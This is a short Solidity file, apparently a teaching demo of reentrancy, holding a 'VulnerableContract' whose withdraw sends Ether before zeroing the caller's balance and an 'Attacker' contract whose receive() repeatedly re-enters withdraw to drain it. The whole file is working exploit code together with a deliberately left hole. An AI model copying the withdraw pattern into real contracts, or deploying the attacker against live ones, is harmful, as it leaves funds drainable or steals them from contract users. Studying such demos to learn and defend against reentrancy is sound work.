// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.24;

contract VulnerableContract {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    //提款函数
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }


    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}

contract Attacker {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableAddress) {
        vulnerableContract = VulnerableContract(_vulnerableAddress);
    }


    function attack() public payable {
        vulnerableContract.deposit{value: 1 ether}();

        vulnerableContract.withdraw();
    }

    receive() external payable {
        if(address(vulnerableContract).balance > 0){
            vulnerableContract.withdraw();
        }
    }


    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}